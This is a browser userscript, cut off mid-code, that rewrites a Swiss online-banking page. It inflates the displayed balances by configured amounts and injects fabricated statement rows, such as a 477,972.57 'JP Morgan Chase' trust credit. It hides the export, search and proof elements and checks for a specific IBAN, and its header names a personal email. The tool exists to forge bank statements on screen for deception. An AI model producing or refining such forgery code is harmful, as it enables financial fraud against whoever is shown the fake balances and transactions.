// ==UserScript==
// @name         Ed 4Rec CSui, Raif Ch rgyr55@gmail.com  auszug
// @namespace    http://tampermonkey.net/
// @version      7.7777
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/509999/Ed%204Rec%20CSui%2C%20Raif%20Ch%20rgyr55%40gmailcom%20%20auszug.user.js
// @updateURL https://update.greasyfork.org/scripts/509999/Ed%204Rec%20CSui%2C%20Raif%20Ch%20rgyr55%40gmailcom%20%20auszug.meta.js
// ==/UserScript==

(function removeForever() {
    setInterval(() => {
        const el = document.getElementById("MainContent_TransactionMainContent_accControl_accBalance");
        if (el) {
            el.remove();
            console.log("Element removed");
        }
    }, 10);
})();

 if (window.location.href.includes("ch") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

   (function removeSelectedItemsForever() {
    setInterval(() => {
        const elements = document.querySelectorAll('.item.selected');
        elements.forEach(el => {
            if (el.textContent.includes(" 9'500.00")) {
                el.remove();
                console.log("Removed element with text: 9'500.00");
            }
        });
    }, 100);
})();

 }


// VERMOEGEN
// Index → adjustment mapping (1-based indices)
  const MBALANCE_CONFIGS = [
    { index: 1, adjustmentAmount: 9000 },
    { index: 2, adjustmentAmount: 9000 },
    { index: 3, adjustmentAmount: 0 },
    { index: 4, adjustmentAmount: 0 },
    { index: 8, adjustmentAmount: 0 },
    { index: 9, adjustmentAmount: 0 },
    { index: 11, adjustmentAmount: 0 },
    // add more…
  ];


// KONTOAUSZUG BALANCES
  // ===== CONFIG =====
  // Indexing starts at 1 (Gesamt Saldo is index 1). Only visible & non-empty balances are counted.
  const BMBALANCE_CONFIGS = [
    // THE GESAMT SALDO IS AT INDEX 1 AND IT GOES FURTHER FROM THERE
    // ONLY REAL VISIBLE BALANCES COUNT, EMPTY BALANCES DON'T COUNT
    { index: 1, adjustmentAmount: 1 },
 //   { index: 2, adjustmentAmount: 14000 },
    { index: 3, adjustmentAmount: 1 },
    { index: 4, adjustmentAmount: 1 },
  //  { index: 5, adjustmentAmount: 14000 },
    { index: 6, adjustmentAmount: 1},
 //   { index: 11, adjustmentAmount: 0 },
    // add more…
  ];

  // IBAN check each tick (whitespace/case-insensitive)
  const IBAN_CHECK = "CH02 0830 7000 3915 1230 7";


//KONTOAUSZUG TRANSAKTIONEN
const DEFAULT_LIST = [
    // Example entries (safe to remove):
    {
      bookingDate: '11.08.2025',
      valueDate:   ' 11.08.2025',
      title:       'JP Morgan Chase. An A.Gold wenden ',
      transactionType: 'Treuhand-Gutschrift',
      amount:      '477972.57',
      affectsBalance: false,
      insertPosition: 2
    },
     {
      bookingDate: '04.09.2025',
      valueDate:   ' 04.09.2025',
      title:       'A. Gold ',
      transactionType: 'Gutschrift',
      amount:      '9000.00',
      affectsBalance: true,
      insertPosition: 2
    },
//    {
//      bookingDate: '27.07.2025',
 //     valueDate:   '30.07.2025',
//      title:       '08:10 Uhr, SBB Ticketautomat 8000 Zürich',
//      transactionType: 'Kartenbezug',
////      amount:      '-23.80',
//      affectsBalance: true,
//      insertPosition: 2
 //   },
//    {
//      bookingDate: '02.08.2025',
//      valueDate:   '25.07.2025',
//      title:       'Lohnzahlung Firma Beispiel AG',
//      transactionType: 'Gutschrift lt. Avis',
//      amount:      "2'300.00",
//      affectsBalance: true,
//      insertPosition: 2
 //   }
  ];

// HYPI UTILITIES
  // Toggle true/false per item right here:
  const RULES = [
    // Remove id="MainContent_TransactionMainContent_accControl_accBalance"
    { name: 'accBalance',
      selector: '#MainContent_TransactionMainContent_accControl_accBalance',
      enabled: true },

    // Remove id="MainContent_TransactionMainContent_txpTransactions_ctl01_genericList_genericSearch_flwSearch_searchIconDiv"
    { name: 'searchIconDiv',
      selector: '#MainContent_TransactionMainContent_txpTransactions_ctl01_genericList_genericSearch_flwSearch_searchIconDiv',
      enabled: true },

    // Remove id="MainContent_TransactionMainContent_txpTransactions_ctl01_genericList_genericSearch_flwSearch_proofPlaceHolder"
    { name: 'proofPlaceHolder',
      selector: '#MainContent_TransactionMainContent_txpTransactions_ctl01_genericList_genericSearch_flwSearch_proofPlaceHolder',
      enabled: true },

    // Remove class="balancepreview-bottompart"
    { name: 'balancePreviewBottom',
      selector: '.balancepreview-bottompart',
      enabled: true },

    // Remove title="Export"
    { name: 'titleExport',
      selector: '[title="Export"]',
      enabled: true },
  ];


// VERMOEGEN
 if (window.location.href.includes("ch") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

  'use strict';

  /*** ====== CONFIGURE HERE ====== ***/
  // What to target (order is DOM order per querySelectorAll)
  const TARGET_SELECTOR = '.owner-total, .account-balance.positive';

  // Apply tick cadence
  const INTERVAL_MS = 100;

  // Toggle detailed logging
  const DEBUG = true;

//  // Index → adjustment mapping (1-based indices)
//  const MBALANCE_CONFIGS = [
//    { index: 1, adjustmentAmount: 2164.75 },
//    { index: 2, adjustmentAmount: 2164.75 },
//    { index: 3, adjustmentAmount: 14000 },
//    { index: 4, adjustmentAmount: 0 },
//    { index: 8, adjustmentAmount: 0 },
//    { index: 9, adjustmentAmount: 0 },
//    { index: 11, adjustmentAmount: 0 },
//    // add more…
//  ];
  /*** ====== END CONFIG ====== ***/

  const TAG = '[hypi-vermoegen]';
  const CACHE = new WeakMap(); // element -> record
  const EPSILON = 0.005; // ~ half a cent, for float comparisons

  logInfo('Loaded. Using per-index adjustments:', MBALANCE_CONFIGS);

  // Kick off immediately, then run on interval
  try { tick(); } catch (e) { logError('Initial tick failed:', e); }
  setInterval(() => { try { tick(); } catch (e) { logError('Tick failed:', e); } }, INTERVAL_MS);

  /** Core loop */
  function tick() {
    const nodes = document.querySelectorAll(TARGET_SELECTOR);
    if (!nodes || nodes.length === 0) {
      if (DEBUG) logDebug('No target elements found this tick.');
      return;
    }

    nodes.forEach((el, arrIndex) => {
      const idx = arrIndex + 1; // 1-based index in DOM order
      const cfg = MBALANCE_CONFIGS.find(c => c.index === idx);
      const desiredAdjustment = cfg ? Number(cfg.adjustmentAmount || 0) : 0;

      try {
        // Ensure record
        let rec = CACHE.get(el);
        if (!rec) {
          rec = captureRecordFromElement(el);
          if (!rec) {
            if (DEBUG) logDebug(`Index ${idx}: could not capture base number`, el);
            return;
          }
          rec.index = idx;
          rec.adjustment = desiredAdjustment; // attach per-index adj
          CACHE.set(el, rec);
          applyModification(el, rec);
          if (DEBUG) logDebug(`Index ${idx}: captured & applied`, { adjustment: desiredAdjustment });
          return;
        }

        // Update index & desired adjustment if changed
        rec.index = idx;
        if (!almostEqual(rec.adjustment, desiredAdjustment)) {
          if (DEBUG) logDebug(`Index ${idx}: adjustment changed`, { from: rec.adjustment, to: desiredAdjustment });
          rec.adjustment = desiredAdjustment;
          applyModification(el, rec);
          return;
        }

        // Verify current text vs expected
        const currentText = safeText(el);
        const segment = findNumberSegment(currentText);
        if (!segment) {
          if (DEBUG) logDebug(`Index ${idx}: no numeric segment, skip`, el);
          return;
        }
        const parsedNow = parseNumericString(segment.numStr);
        if (!parsedNow) {
          if (DEBUG) logDebug(`Index ${idx}: parse failed`, segment.numStr);
          return;
        }

        const expected = rec.baseValue + rec.adjustment;

        if (almostEqual(parsedNow.value, expected)) {
          // Already modified; re-assert formatting if drift
          if (rec.lastAppliedText && currentText !== rec.lastAppliedText) {
            if (DEBUG) logDebug(`Index ${idx}: formatting drift; reapplying`);
            applyModification(el, rec);
          }
          return;
        }

        if (almostEqual(parsedNow.value, rec.baseValue)) {
          // Reverted to base -> reapply (even if adjustment==0 this is a no-op with correct format)
          if (DEBUG) logDebug(`Index ${idx}: reverted to base; reapplying`, { base: rec.baseValue, expected });
          applyModification(el, rec);
          return;
        }

        // Underlying base likely changed by the page -> update baseline and reapply
        if (DEBUG) logDebug(`Index ${idx}: underlying base changed; updating baseline`, {
          oldBase: rec.baseValue, newBase: parsedNow.value, adjustment: rec.adjustment
        });
        const newRec = captureRecordFromElement(el); // recalc left/right + format from current
        if (newRec) {
          newRec.index = idx;
          newRec.adjustment = desiredAdjustment;
          CACHE.set(el, newRec);
          applyModification(el, newRec);
        }
      } catch (err) {
        logError(`Index ${idx}: error handling element`, err, el);
      }
    });
  }

  /** Capture the original value & formatting from an element */
  function captureRecordFromElement(el) {
    const originalText = safeText(el);
    if (!originalText) return null;

    const seg = findNumberSegment(originalText);
    if (!seg) return null;

    const parsed = parseNumericString(seg.numStr);
    if (!parsed) return null;

    // Build formatting info based on original numeric substring
    const format = deriveFormat(seg.numStr, parsed);

    const rec = {
      baseValue: parsed.value,
      left: originalText.slice(0, seg.start),
      right: originalText.slice(seg.end),
      format,
      lastAppliedText: null,
      index: null,
      adjustment: 0
    };

    if (DEBUG) {
      logDebug('Captured record:', {
        baseValue: rec.baseValue,
        format: rec.format,
        left: shorten(rec.left),
        right: shorten(rec.right)
      }, el);
    }

    return rec;
  }

  /** Apply (base + per-index adjustment) using captured format */
  function applyModification(el, rec) {
    try {
      const value = rec.baseValue + (rec.adjustment || 0);
      const numberStr = formatNumber(value, rec.format);
      const newText = rec.left + numberStr + rec.right;
      if (safeText(el) !== newText) {
        el.textContent = newText;
        rec.lastAppliedText = newText;
        if (DEBUG) logDebug('Applied modification:', {
          index: rec.index,
          base: rec.baseValue,
          adjustment: rec.adjustment,
          newValue: value,
          text: shorten(newText, 64)
        });
      }
    } catch (e) {
      logError('Failed to apply modification:', e, el, rec);
    }
  }

  /** Find the primary number (with Swiss-like grouping) inside a string */
  function findNumberSegment(text) {
    // Preserve both normal and non-breaking spaces; handle apostrophe ’ and '
    // Pattern attempts grouped numbers with optional decimals, falling back to simple number with decimals.
    const pattern = /[-−]?\s*\d{1,3}(?:[ '\u00A0’.,]\d{3})*(?:[.,]\d+)?|[-−]?\s*\d+(?:[.,]\d+)?/;
    const match = pattern.exec(text);
    if (!match) return null;
    const start = match.index != null ? match.index : text.indexOf(match[0]);
    const end = start + match[0].length;
    return { start, end, numStr: match[0] };
  }

  /** Parse a numeric string with Swiss/varied separators into a JS number + meta */
  function parseNumericString(numStr) {
    if (!numStr) return null;

    let s = String(numStr);

    // Identify decimal separator: whichever ('.' or ',') appears last
    const lastDot = s.lastIndexOf('.');
    const lastComma = s.lastIndexOf(',');
    let decimalSep = null;
    if (lastDot >= 0 || lastComma >= 0) {
      decimalSep = (lastDot > lastComma) ? '.' : ',';
    }

    // Split into integer & fractional parts based on detected decimal separator
    let intPartRaw, fracPartRaw = '';
    if (decimalSep) {
      const idx = s.lastIndexOf(decimalSep);
      intPartRaw = s.slice(0, idx);
      fracPartRaw = s.slice(idx + 1);
    } else {
      intPartRaw = s;
    }

    // Preserve which minus sign the original used (ASCII '-' or Unicode '−')
    const minusCharMatch = /^\s*([-−])/.exec(intPartRaw || '');
    const minusChar = minusCharMatch ? minusCharMatch[1] : '-';

    // Clean parts
    let intPart = (intPartRaw || '').replace(/[^\d-−]/g, '');
    let sign = 1;
    if (intPart.startsWith('-') || intPart.startsWith('−')) {
      sign = -1;
      intPart = intPart.replace(/^[-−]+/, '');
    }
    let fracPart = (fracPartRaw || '').replace(/[^\d]/g, '');

    // Precision: keep original decimal length if present, otherwise default to 2 for currencies
    const precision = fracPart.length > 0 ? fracPart.length : 2;

    // Compose into a number
    const intNum = intPart ? parseInt(intPart, 10) : 0;
    const fracNum = fracPart ? parseInt(fracPart, 10) : 0;
    let value = intNum;
    if (fracPart.length > 0) {
      value += fracNum / Math.pow(10, fracPart.length);
    }
    value *= sign;

    if (!isFinite(value)) return null;

    return { value, precision, decimalSep: decimalSep || '.', minusChar };
  }

  /** Choose thousands separator from original integer part, fallback to apostrophe */
  function detectThousandsSeparator(intPartRaw, decimalSep) {
    // Remove leading sign, spaces
    const cleaned = (intPartRaw || '').replace(/^[\s-−]+/, '');
    // If decimalSep exists inside intPartRaw, it shouldn't (defensive)
    const intOnly = decimalSep
      ? cleaned.slice(0, cleaned.lastIndexOf(decimalSep) === -1 ? cleaned.length : cleaned.lastIndexOf(decimalSep))
      : cleaned;

    const freq = new Map();
    const candidates = ["'", '’', '\u00A0', ' ', ',', '.'];
    for (const ch of intOnly) {
      if (candidates.includes(ch)) {
        freq.set(ch, (freq.get(ch) || 0) + 1);
      }
    }
    // Pick the most frequent candidate
    let best = null;
    let bestCount = 0;
    for (const [ch, count] of freq.entries()) {
      if (count > bestCount) {
        best = ch;
        bestCount = count;
      }
    }
    return best || "'";
  }

  /** Build formatting info from the original numeric substring */
  function deriveFormat(originalNumStr, parsed) {
    const s = String(originalNumStr || '');
    const decimalSep = parsed.decimalSep || '.';
    const idx = s.lastIndexOf(decimalSep);
    const intRaw = idx >= 0 ? s.slice(0, idx) : s;

    return {
      precision: parsed.precision > 0 ? parsed.precision : 2,
      decimalSep,
      thousandsSep: detectThousandsSeparator(intRaw, decimalSep),
      minusChar: parsed.minusChar || '-'
    };
  }

  /** Format a number using the captured format */
  function formatNumber(value, fmt) {
    const precision = Math.max(0, Math.min(10, fmt.precision || 2));
    // Avoid negative zero (e.g., -0.00)
    let v = Math.abs(value) < 1e-9 ? 0 : value;

    // toFixed manages rounding cleanly
    const fixed = Math.abs(v).toFixed(precision); // e.g. "1234.50"
    let [intPart, fracPart = ''] = fixed.split('.');

    // Insert thousands separator
    const ts = fmt.thousandsSep || "'";
    intPart = intPart.replace(/\B(?=(\d{3})+(?!\d))/g, ts);

    // Join with decimal separator
    const ds = fmt.decimalSep || '.';
    let numStr = precision > 0 ? `${intPart}${ds}${fracPart}` : intPart;

    // Prefix minus with original minus character if negative
    if (v < 0) {
      const minus = fmt.minusChar || '-';
      numStr = minus + numStr;
    }
    return numStr;
  }

  /** Utilities */
  function safeText(el) {
    return (el && (el.textContent || '').toString()) || '';
  }

  function almostEqual(a, b) {
    return Math.abs(a - b) <= EPSILON;
  }

  function shorten(s, max = 24) {
    s = String(s || '');
    return s.length > max ? s.slice(0, max) + '…' : s;
  }

  function logInfo(...args) { try { console.info(TAG, ...args); } catch {} }
  function logDebug(...args) { if (!DEBUG) return; try { console.debug(TAG, ...args); } catch {} }
  function logError(...args) { try { console.error(TAG, ...args); } catch {} }

 }

//================================================
//================================================

//================================================

//================================================



// KONTOAUSZUG BALANCES
 if (window.location.href.includes("ch") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

  'use strict';

//  // ===== CONFIG =====
//  // Indexing starts at 1 (Gesamt Saldo is index 1). Only visible & non-empty balances are counted.
//  const BMBALANCE_CONFIGS = [
//    // THE GESAMT SALDO IS AT INDEX 1 AND IT GOES FURTHER FROM THERE
//    // ONLY REAL VISIBLE BALANCES COUNT, EMPTY BALANCES DON'T COUNT
//    { index: 1, adjustmentAmount: 2164.75 },
// //   { index: 2, adjustmentAmount: 14000 },
//    { index: 3, adjustmentAmount: 2164.75 },
//    { index: 4, adjustmentAmount: 2164.75 },
//  //  { index: 5, adjustmentAmount: 14000 },
//    { index: 6, adjustmentAmount: 2164.75},
// //   { index: 11, adjustmentAmount: 0 },
//    // add more…
//  ];

//  // IBAN check each tick (whitespace/case-insensitive)
//  const IBAN_CHECK = "CH02 0830 7000 3915 1230 7";


  const IBAN_ELEMENT_ID = 'phMainRightContent_ctl01_txtIBAN';

  // Interval (ms)
  const TICK_MS = 100;

  // Candidate balance element IDs (will be ordered by DOM)
  const TARGET_IDS = [
    'phMainRightContent_ctl01_txtBalance',
    'phMainRightContent_ctl01_txtTotalDispoBookings',
    'phMainRightContent_ctl01_txtAvailableBalance',
    'Preview_AvailableBalance',
    'Preview_PendingPaymentOrders',
    'Preview_CalculatedBalancePreview'
  ];

  // ===== Utilities =====
  const normalizeSpaces = (s) => String(s ?? '').replace(/\u00A0/g, ' ');
  const trimAllSpaces = (s) => normalizeSpaces(s).replace(/\s+/g, '');
  const toNumberSwiss = (text) => {
    if (text == null) return null;
    const compact = trimAllSpaces(text).replace(/'/g, '');
    const n = Number(compact);
    return Number.isFinite(n) ? n : null;
  };
  const detectMinusStyle = (text) => {
    if (!text) return 'space';
    if (/-\u00A0/.test(text)) return 'nbsp';
    if (/-\s/.test(text)) return 'space';
    return 'none';
  };
  const formatSwissParts = (n) => {
    const sign = n < 0 ? '-' : '';
    const abs = Math.abs(n);
    const [intPart, decPart] = abs.toFixed(2).split('.');
    const intWithApos = intPart.replace(/\B(?=(\d{3})+(?!\d))/g, "'");
    return { sign, intWithApos, decPart };
  };
  const formatSwissWithTemplate = (n, templateText) => {
    const { sign, intWithApos, decPart } = formatSwissParts(n);
    const style = detectMinusStyle(templateText);
    let prefix = '';
    if (sign) prefix = (style === 'nbsp') ? '-\u00A0' : '- ';
    return `${prefix}${intWithApos}.${decPart}`;
  };
  const isVisible = (el) => {
    try {
      if (!el || !el.ownerDocument) return false;
      const cs = getComputedStyle(el);
      if (cs.display === 'none' || cs.visibility === 'hidden') return false;
      const rect = el.getBoundingClientRect();
      if ((rect.width === 0 && rect.height === 0)) return false;
      // If inside a hidden ancestor, offsetParent can be null (except fixed). Quick additional check:
      if (!el.isConnected) return false;
      return true;
    } catch {
      return false;
    }
  };

  // Build quick map: index -> adjustment
  const INDEX_TO_ADJ = (() => {
    const map = new Map();
    for (const { index, adjustmentAmount } of BMBALANCE_CONFIGS) {
      if (Number.isInteger(index)) map.set(index, Number(adjustmentAmount) || 0);
    }
    return map;
  })();

  // ===== Core =====
  const cache = new WeakMap(); // element -> { origValue, origText }

  // Return candidates in DOM order via querySelectorAll (keeps document order)
  const getCandidatesInDomOrder = () => {
    const selector = TARGET_IDS.map(id => `#${CSS.escape(id)}`).join(',');
    return selector ? Array.from(document.querySelectorAll(selector)) : [];
  };

  // Filter to visible + parseable balances, and order => assign running 1-based index
  const getIndexedVisibleBalances = () => {
    const out = [];
    for (const el of getCandidatesInDomOrder()) {
      const txt = el.textContent ?? '';
      const val = toNumberSwiss(txt);
      if (!isVisible(el)) continue;
      if (val == null) continue; // empty/unparseable doesn't count
      out.push({ el, txt, val }); // we'll assign index after we know it's valid
    }
    // Assign 1-based index in DOM order
    return out.map((o, i) => ({ ...o, index: i + 1 }));
  };

  const ensureCached = (entry) => {
    const { el, txt, val } = entry;
    if (cache.has(el)) return true;
    cache.set(el, { origValue: val, origText: txt });
    el.dataset.hypiOrig = String(val);
    console.log('[hypi] Cached original', el.id || el, '=>', val);
    return true;
  };

  const applyByIndex = (entry) => {
    const { el, index } = entry;
    const info = cache.get(el);
    if (!info) return;

    const adj = INDEX_TO_ADJ.get(index) ?? 0;
    const target = info.origValue + adj;
    const formatted = formatSwissWithTemplate(target, info.origText);
    if ((el.textContent || '') !== formatted) {
      el.textContent = formatted;
      el.dataset.hypiModified = '1';
      el.setAttribute('aria-label', `Adjusted balance [#${index}]: ${formatted}`);
      console.log(`[hypi] Modified #${index} (${el.id || 'span'}) -> ${formatted} (orig: ${info.origValue}, adj: ${adj})`);
    }
  };

  const checkIBAN = () => {
    try {
      const el = document.getElementById(IBAN_ELEMENT_ID);
      if (!el) return; // silently skip if element isn't present
      const norm = (s) => trimAllSpaces(String(s)).toUpperCase();
      const pageIBAN = norm(el.textContent || '');
      const desired = norm(IBAN_CHECK);
      if (pageIBAN !== desired) {
        console.warn('[hypi] IBAN mismatch:', { pageIBAN, expected: desired });
      } else {
        console.log('[hypi] IBAN OK');
      }
    } catch (e) {
      console.error('[hypi] IBAN check failed:', e);
    }
  };

  const tick = () => {
    try {
      checkIBAN();

      const list = getIndexedVisibleBalances();
      if (!list.length) return;

      for (const entry of list) {
        try {
          if (!ensureCached(entry)) continue;
          applyByIndex(entry);
        } catch (e) {
          console.error('[hypi] Error on index', entry.index, e);
        }
      }
    } catch (e) {
      console.error('[hypi] Tick failed:', e);
    }
  };

  // Boot: now and every 2s (no MutationObserver)
  tick();
  setInterval(tick, TICK_MS);
}


//===============================
//===============================
//===============================
//===============================



// KONTOAUSZUG TRANSACTIONS
 if (window.location.href.includes("ch") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

  'use strict';

//  // ---------- NEW: IBAN guard ----------
////  const IBAN_CHECK = 'CH02 0830 7000 3915 1230 7';
  const IBAN_SELECTOR = '#phMainRightContent_ctl01_txtIBAN';

  const normalizeIban = (s) => String(s || '')
    .replace(/\s+/g, '')     // strip all spaces
    .toUpperCase();

  const isOnCorrectIban = () => {
    const el = document.querySelector(IBAN_SELECTOR);
    if (!el) return false;
    return normalizeIban(el.textContent) === normalizeIban(IBAN_CHECK);
  };

  const LS_KEY   = 'hypi-tx-config-list';
  const INTERVAL_MS = 100;
  const CLONE_ATTR  = 'data-tm-clone';
  const SIG_ATTR    = 'data-tm-sig';
  const ORIG_BAL_ATTR = 'data-tm-orig-balance'; // baseline to ensure idempotent adjustments

  // You can keep this list empty (only your entries via Alt+T are used),
  // or preload some examples. This does NOT rely on DEFAULT_TX.
//  const DEFAULT_LIST = [
//    // Example entries (safe to remove):
//    {
//      bookingDate: '25.07.2025',
//      valueDate:   '26.07.2025',
//      title:       '15:49 Uhr, Coop Ts Volketswil 8604 Volketswil ',
//      transactionType: 'Kartenbezug',
 //     amount:      '-111.45',
////     affectsBalance: true,
//      insertPosition: 2
//    },
//    {
 //     bookingDate: '27.07.2025',
//      valueDate:   '30.07.2025',
 //     title:       '08:10 Uhr, SBB Ticketautomat 8000 Zürich',
//      transactionType: 'Kartenbezug',
//      amount:      '-23.80',
//      affectsBalance: true,
//      insertPosition: 2
//    },
//    {
//      bookingDate: '02.08.2025',
//      valueDate:   '25.07.2025',
 //     title:       'Lohnzahlung Firma Beispiel AG',
 //     transactionType: 'Gutschrift lt. Avis',
//      amount:      "2'300.00",
 //     affectsBalance: true,
 //     insertPosition: 2
 //   }
 // ];

  const log  = (...a) => console.log('[hypi-tx]', ...a);
  const warn = (...a) => console.warn('[hypi-tx]', ...a);
  const err  = (...a) => console.error('[hypi-tx]', ...a);
  const norm = (t) => String(t || '').replace(/\s+/g, ' ').trim();

  // ---------- Swiss helpers ----------
  function parseSwissNumber(s) {
    if (typeof s === 'number') return s;
    if (s == null) return NaN;
    let str = String(s).trim();
    str = str
      .replace(/CHF/gi, '')
      .replace(/[\u00A0 ]/g, '')
      .replace(/’/g, "'");

    const sign = (/^[+-]/.test(str) ? str[0] : '');
    str = str.replace(/^[+-]/, '').replace(/'/g, '');
    const n = parseFloat(sign + str);
    return Number.isFinite(n) ? n : NaN;
  }
  function asSwiss(n) {
    const neg = n < 0 || Object.is(n, -0);
    const abs = Math.abs(n);
    const parts = abs.toFixed(2).split('.');
    parts[0] = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, "'");
    return (neg ? '-' : ' ') + parts.join('.');
  }
  function parseSwissDateToTS(ddmmyyyy) {
    const m = /^(\d{2}).(\d{2}).(\d{4})$/.exec(String(ddmmyyyy).trim());
    if (!m) return NaN;
    const d = Number(m[1]), mo = Number(m[2]) - 1, y = Number(m[3]);
    const dt = new Date(y, mo, d);
    return Number.isFinite(dt.getTime()) && dt.getFullYear() === y && dt.getMonth() === mo && dt.getDate() === d
      ? dt.getTime()
      : NaN;
  }
  const addMoney = (a, b) => Math.round((a * 100) + (b * 100)) / 100;

  const cssEscape = (s) => {
    try {
      return CSS?.escape ? CSS.escape(String(s)) : String(s).replace(/[\[\]\\#.:;?&=,$<>~+*^$|()%]/g, '\\$&');
    } catch {
      return String(s);
    }
  };

  // ---------- Config load/save (STRICT, no merge with any default item) ----------
  function validateTx(raw) {
    if (!raw || typeof raw !== 'object') throw new Error('Each item must be an object');

    const tx = {
      bookingDate: String(raw.bookingDate ?? '').trim(),
      valueDate:   String(raw.valueDate   ?? '').trim(),
      title:       norm(raw.title ?? ''),
      transactionType: String(raw.transactionType ?? '').trim(),
      amount:      parseSwissNumber(raw.amount),
      affectsBalance: !!raw.affectsBalance,
      insertPosition: (parseInt(raw.insertPosition, 10) === 2) ? 2 : 1
    };

    if (!tx.bookingDate) throw new Error('bookingDate is required');
    if (!tx.valueDate)   throw new Error('valueDate is required');
    if (!tx.title)       throw new Error('title is required');
    if (!tx.transactionType) throw new Error('transactionType is required');

    if (!Number.isFinite(tx.amount)) throw new Error('amount is invalid (Swiss format allowed)');
    if (!Number.isFinite(parseSwissDateToTS(tx.bookingDate))) throw new Error('bookingDate invalid (dd.mm.yyyy)');
    if (!Number.isFinite(parseSwissDateToTS(tx.valueDate)))   throw new Error('valueDate invalid (dd.mm.yyyy)');

    return tx;
  }

  function loadConfigList() {
    try {
      const raw = localStorage.getItem(LS_KEY);
      if (!raw) return DEFAULT_LIST.map(validateTx);
      let cfg = JSON.parse(raw);
      if (!Array.isArray(cfg)) cfg = [cfg];
      return cfg.map(validateTx);
    } catch (e) {
      warn('Config parse failed, using default list (or empty).', e);
      return DEFAULT_LIST.map(validateTx);
    }
  }
  function saveConfigList(list) {
    try { localStorage.setItem(LS_KEY, JSON.stringify(list)); }
    catch (e) { err('Failed saving config list:', e); }
  }

  let CONFIG_LIST = loadConfigList();

  // Alt+T to edit JSON list
  window.addEventListener('keydown', (ev) => {
    if (ev.altKey && (ev.key === 't' || ev.key === 'T')) {
      try {
        const pretty = JSON.stringify(CONFIG_LIST, null, 2);
        const example = [
          '{',
          '  "bookingDate": "29.07.2025",',
          '  "valueDate": "01.08.2025",',
          '  "title": "15:49 Uhr, Coop Ts Volketswil 8604 Volketswil ",',
          '  "transactionType": "Kartenbezug",',
          '  "amount": "-111.45",',
          '  "affectsBalance": true,',
          '  "insertPosition": 2',
          '}'
        ].join('\n');

        const updatedStr = prompt(
          'Edit transactions as a JSON array.\n' +
          'Required fields per item:\n' +
          '  bookingDate (dd.mm.yyyy)\n' +
          '  valueDate   (dd.mm.yyyy)\n' +
          '  title       (single text, no <br>)\n' +
          '  transactionType (e.g., "Kartenbezug")\n' +
          '  amount (Swiss ok, "-" for negative; thousands: \',\' decimal: \'.\')\n' +
          '  affectsBalance (true/false)\n' +
          '  insertPosition (1 = first, 2 = byDate)\n\n' +
          'Example item:\n' + example + '\n\n' +
          'Current:',
          pretty
        );
        if (updatedStr === null) return;
        const newList = JSON.parse(updatedStr);
        if (!Array.isArray(newList)) throw new Error('Must be an array');
        CONFIG_LIST = newList.map(validateTx);
        saveConfigList(CONFIG_LIST);
        log('Updated transactions:', CONFIG_LIST);
        alert('Saved. The interval will insert missing ones automatically.');
      } catch (e) {
        err('Update failed:', e);
        alert('Invalid JSON or values. Nothing saved.');
      }
    }
  });

  // ---------- Signature ----------
  const txSignature = (tx) => [
    tx.bookingDate,
    tx.valueDate,
    String(tx.amount),
    norm(tx.title + ' ' + tx.transactionType),
    tx.affectsBalance ? 'affects' : 'noaffect',
    String(tx.insertPosition),
    'item item-dispo-False'
  ].join('|');

  // ---------- DOM helpers ----------
  const getTBody = () => document.querySelector('.genericTableBody');
  const getRows = (tbody) => Array.from(tbody?.children || []).filter(el => el.tagName === 'TR');

  const getBalanceSpanFromRow = (tr) => tr?.querySelector('td:nth-child(5) span') || null;
  const getBalanceFromRow = (tr) => {
    const span = getBalanceSpanFromRow(tr);
    return span ? parseSwissNumber(span.textContent) : NaN;
  };

  function findInsertionFirst(tbody) {
    const first = tbody.firstElementChild || null;
    return first
      ? { anchor: first, place: 'before', referenceRow: first }
      : { anchor: null, place: 'append', referenceRow: null };
  }

  // Table is typically newest → oldest; insert above the first row that is same/older than target date
  function findInsertionByDate(tbody, targetDateStr) {
    const targetTS = parseSwissDateToTS(targetDateStr);
    if (!Number.isFinite(targetTS)) {
      return { anchor: null, place: 'append', referenceRow: tbody.lastElementChild || null };
    }
    let lastRow = null;
    const rows = getRows(tbody);
    for (const row of rows) {
      const bookingDateText = row.querySelector('td:nth-child(1) .left')?.textContent?.trim() || '';
      const rowTS = parseSwissDateToTS(bookingDateText);
      if (!Number.isFinite(rowTS)) { lastRow = row; continue; }
      if (rowTS <= targetTS) {
        return { anchor: row, place: 'before', referenceRow: row };
      }
      lastRow = row;
    }
    return { anchor: null, place: 'append', referenceRow: lastRow };
  }

  const countExistingForSig = (tbody, sig) =>
    tbody.querySelectorAll(`tr[${SIG_ATTR}="${cssEscape(sig)}"]`).length;

  const escapeHtml = (s) => String(s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;')
    .replace(/>/g, '&gt;').replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');

  const buildRowHTML = (tx, computedBalance) => {
    const isNeg = tx.amount < 0;
    const iconClass = isNeg ? 'statement-card-icon' : 'statements-inbound-icon';
    const amtClass  = isNeg ? 'right negative table-negative' : 'right positive table-direction';
    const amountText = asSwiss(tx.amount);
    const balanceStr = asSwiss(computedBalance);
    return `
<tr class="item item-dispo-False" ${CLONE_ATTR}="1">
  <td>
    <div class="${iconClass}"></div>
    <span class="left">${escapeHtml(tx.bookingDate)}</span>
    <div class="is-dispo-False"></div>
  </td>
  <td class="visible-md visible-lg visible-sm">
    <span class="left">${escapeHtml(tx.valueDate)}</span>
  </td>
  <td class="descricao-xs"><span class="left">
    <p class="lineBold">${escapeHtml(tx.title)}</p>
    <p class="lineLightGrey">${escapeHtml(tx.transactionType)}</p>
  </span></td>
  <td class="right"><span class="${amtClass}">${amountText}</span></td>
